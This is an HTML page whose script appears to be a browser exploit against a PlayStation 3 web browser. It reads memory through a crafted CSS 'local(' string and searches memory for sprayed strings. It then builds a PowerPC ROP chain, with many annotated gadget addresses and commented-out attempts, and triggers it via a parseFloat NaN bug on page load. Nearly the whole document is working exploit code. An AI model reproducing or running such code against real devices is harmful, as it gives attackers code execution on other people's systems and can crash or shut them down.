<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		while (1)
		{
			var search_base = 0x80200000;
			var search_size = 0x0027500;
			
			var dat = readMemory(search_base, search_size);
			
			// move past "local("
			dat = dat.substr(6, search_size);
			
			// loop for tag
			for (var i = 0; i < (search_size*2); i += 0x10)
			//for (var i = 0; i < (20000*0x10); i += 0x10)
			{
				if (i > 20000*0x10) {return 0;}
				if (dat.charCodeAt(i/2) == pattern)
				{
					var match = 0;
					
					// loop next 5 bits
					for (var k = 0; k < len; k+=2)
					{
						// convert to string
						if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
						{
							break;
						}
						// increment match
						match += 2;
					}
					
					// we got a complete match
					if (match == len)
					{
						// hold exploit addr
						var exploit_addr = search_base + i + 2;
						
						// display the exploit address
						dbg("Found " + name + " at: " + exploit_addr.toString(16));
						//dbg("Loop: "+(i/0x10));
						dat=null;
						return exploit_addr;
					}
				}
			}
			dat=null;			
		}
		dbg("string var could not be located in search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,j1,j2;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var trigger_state=false;
		
		dbg("Processing gadget string.. Searching for valid offset....");			
		do{
		
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// Working, well it does the syscalls
		//gadget =  unescape("\u7E2F\u000C\u6740\u7E2F"); //  sys_sm_shutdown 
		//gadget =  unescape("\u7E2F\u0061\u04E0\u7E2F"); //  sys_process_exit 
		
		//gadget =  unescape("\u7E2F\u0001\u0484\u7E2F"); //  
		
		// puts us in a loop at 0x00614994
		//gadget =  unescape("\u7E2F\u0027\u8E38\u7E2F"); // 0x0000000000278e38 : addi r1, r1, 0x70 ; blr ; blr ; blr // 382100704e8000204e8000204e800020
		 
		 
		 
		 
		// need to control value at address here 0x8FD8D760 for r0
		// need to control value+0x110 at address here 0x8FD8D6C0 for r1 & r3 & r28 & r31??
		// need to control value at address here 0x8FD8D6E8 for r2
		// need to control value at address here 0x802015D2 for r4
		// need to control value at address here 0x8F780150 for r5
		// need to control value at address here 0x8FD8E3C8 for r7
		// need to control value at address here 0x802015D2 for r10
		// need to control value at address here 0x84088044 for r12
		// need to control value at address here 0x8FD8E3C8 for r22 & r25
		// r29 is r28+0x04
		//gadget =  unescape("\u7E2F\u0002\u0230\u7E2F"); // 0x0000000000020230 : addi r1, r1, 0x100 ; blr // 382101004e800020
		 
		//gadget =  unescape("\u7E2F\u0001\u14C4\u7E2F"); // 0x00000000000114c4 : li r0, -1 ; std r0, 0x160(r31) ; ld r3, 0x160(r31) ; ld r11, 0(r1) ; ld r0, 0x10(r11) ; mtlr r0 ; ld r31, -8(r11) ; mr r1, r11 ; blr // 3800fffff81f0160e87f0160e9610000e80b00107c0803a6ebebfff87d615b784e800020
		
		//gadget =  unescape("\u7E2F\u0001\u14C8\u7E2F"); // 
		
		//gadget =  unescape("\u7E2F\u0001\u14D4\u7E2F"); // 
		
		//gadget =  unescape("\u7E2F\u0001\u14D8\u7E2F"); // 
		
		
		/*
		00011578 7C0803A6 mtspr      lr,r0
		0001157C 38210090 addi       r1,r1,0x90
		00011580 4E800020 blr
		*/
		//gadget =  unescape("\u7E2F\u0001\u1578\u7E2F"); // infinite loop need to set lr
		
		
		//gadget =  unescape("\u7E2F\u0003\uF57C\u7E2F"); // 0x000000000003f57c : ld r0, 0x10(r1) ; mtlr r0 ; blr // e80100107c0803a64e800020
		
		
		//gadget =  unescape("\u7E2F\u0002\uC0D8\u7E2F"); // 0x000000000002c0d8 : ld r0, 0x90(r1) ; addi r1, r1, 0x80 ; mtlr r0 ; blr // e8010090382100807c0803a64e800020
		
		
		// **Possible Candidate**
		//gadget =  unescape("\u7E2F\u0006\u0928\u7E2F"); // 0x0000000000060928 : ld r0, 0xb0(r1) ; addi r1, r1, 0xa0 ; mtlr r0 ; blr // e80100b0382100a07c0803a64e800020
		
		
		//gadget =  unescape("\u7E2F\u0061\u595C\u7E2F"); // 0x000000000061595c : stw r0, 4(r11) ; ld r0, 0x10(r1) ; mtlr r0 ; blr // 900b0004e80100107c0803a64e800020
		
		// pushes address into high byte of r0
		//gadget =  unescape("\u7E2F\u0007\uEB08\u7E2F"); // 0x000000000007eb08 : ld r0, 0x4d0(r1) ; addi r1, r1, 0x4c0 ; mtlr r0 ; blr // e80104d0382104c07c0803a64e800020
		
		//gadget =  unescape("\u7E2F\u0001\u0b24\u7E2F"); // 0x0000000000010b24 : ld r0, 0x10(r11) ; mtlr r0 ; ld r31, -8(r11) ; mr r1, r11 ; blr // e80b00107c0803a6ebebfff87d615b784e800020
		
		
		//gadget =  unescape("\u7E2F\u0037\uFF48\u7E2F"); // 0x000000000037ff48 : stw r0, 0x25e0(r9) ; ld r0, 0x10(r1) ; mtlr r0 ; blr // 900925e0e80100107c0803a64e800020
		
		
		//gadget =  unescape("\u02F7\u002E\uF8A4\u02F7"); // 0x00000000002ef8a4 : ld r2, 0x28(r1) ; ld r0, 0xc0(r1) ; ld r29, 0x98(r1) ; addi r1, r1, 0xb0 ; mtlr r0 ; blr // e8410028e80100c0eba10098382100b07c0803a64e800020
		
		
		gadget =  unescape("\u02F7\u000D\uD418\u02F7"); // 0x00000000000dd418 : ld r2, 0x28(r1) ; ld r0, 0xe0(r1) ; li r3, 0 ; ld r29, 0xb8(r1) ; addi r1, r1, 0xd0 ; mtlr r0 ; blr // e8410028e80100e038600000eba100b8382100d07c0803a64e800020
		
		
		//gadget_addr = findExploit("gadget",gadget,0x7E2F,0x4);
		gadget_addr = findExploit("gadget",gadget,0x02F7,0x4);
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");	
		do{
		//jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u7E2F");
		//jump_2 = unescape("\u4343\u02F7\u0000\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u7E2F");
		jump_2 = unescape("\u4343\u02F7\u0000\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u02F7");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));
		//j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x7E2F));
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x02F7));
		//jump_2_addr = findExploit("j2",j2,0x7E2F,0x1C);
		jump_2_addr = findExploit("j2",j2,0x02F7,0x1C);
		}
		while(jump_2_addr==0);
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		do{
		//jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = unescape("\u4141\u4141\u4141\u02F7");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));
		//j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x02F7));
		//jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		jump_1_addr = findExploit("j1",j1,0x02F7,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		//dbg("gadget: "+a2hexnull(gadget));
		dbg("gadget: " + a2hex(gadget));
		dbg("gadget variable offset (r11): " + gadget_addr.toString(16));
		//dbg("jump_2: "+a2hexnull(j2));
		dbg("gadget (r2 1st 2 bytes + 0000): "+a2hex(j2));
		dbg("jump_2 variable offset (r9): " + jump_2_addr.toString(16));
		//dbg("jump_1: "+a2hexnull(j1));
		dbg("gadget: " + a2hex(j1));
		dbg("jump_1 variable offset (r4 + r24lo): " + jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		
		
		// Show address info
		alert("Press OK To Proceed....\n" + "\njump_1 variable offset (r4 + r24lo): " + jump_1_addr.toString(16) + "\njump_2 variable offset (r9): " + jump_2_addr.toString(16) + "\ngadget variable offset (r11): " + gadget_addr.toString(16));
		
		
		// Check trigger state
		if (confirm('Proceed To Trigger?')) {
		//alert('trigger ' + jump_1_addr.toString(16));
		trigger(jump_1_addr);
		trigger_state = true;
		} else {
			trigger_state = false
		}
		
		// Refresh Page?
		if (!trigger_state) {
			if (confirm('Refresh Page?')) {
			location.reload();
			} else {
				return;
			}
		}
		
		trigger_state = false;
		//trigger(jump_1_addr);
		return;
	} catch(e) {
		dbg(e);
	}
}


</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears, reload page because exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
